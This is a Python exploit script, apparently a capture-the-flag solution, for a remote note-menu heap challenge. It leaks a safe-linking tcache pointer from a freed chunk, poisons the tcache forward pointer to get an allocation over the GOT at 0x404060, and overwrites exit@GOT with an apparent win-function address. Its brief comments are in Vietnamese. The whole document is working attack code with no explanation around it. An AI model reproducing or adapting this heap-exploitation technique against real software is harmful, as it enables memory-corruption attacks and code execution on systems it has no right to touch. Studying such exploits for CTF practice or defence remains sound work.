import socket
import struct
import sys

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
s = socket.create_connection(("pwn.h7tex.com", 42589), timeout=15)


def rd(t=1.0, label=""):
    s.settimeout(t)
    buf = b""
    while True:
        try:
            c = s.recv(4096)
        except socket.timeout:
            break
        if not c:
            break
        buf += c
    print("  [%s] %r" % (label, buf[:170]))
    return buf


def choice(n):
    s.sendall(b"%d\n" % n)
    return rd(0.8, "c%d" % n)


def idx(i, label):
    s.sendall(b"%d\n" % i)
    return rd(0.8, label)


def note(b, label):
    s.sendall(b)
    return rd(0.8, label)


rd(1.5, "banner")
choice(1); idx(0, "add0i"); note(b"AAAA", "add0n")
choice(1); idx(1, "add1i"); note(b"BBBB", "add1n")
choice(2); idx(0, "del0")
choice(4); leak = idx(0, "view0")
t = struct.unpack("<Q", leak[:8])[0]
print("  t=0x%x  A~0x%x" % (t, t << 12))
choice(4); v1 = idx(1, "view1 truoc khi poison")
print("  B content:", v1[:16].hex())
choice(2); idx(1, "del1")
choice(3); idx(1, "edit1i"); note(struct.pack("<Q", t ^ 0x404060), "edit1 fd")
choice(1); idx(2, "add2i"); note(b"C", "add2n")
choice(1); idx(3, "add3i"); note(b"D", "add3n")
choice(4); v3 = idx(3, "view3 (phải là nội dung tại 0x404060)")
print("  8 byte đầu của view3 = %s (exit@GOT chưa resolve = con trỏ libc 0x7f..)"
      % v3[:8].hex())
choice(3); idx(3, "edit3i"); note(struct.pack("<Q", 0x4012B6), "edit3n")
s.shutdown(socket.SHUT_WR)
rd(5.0, "SAU KHI EOF")
s.close()
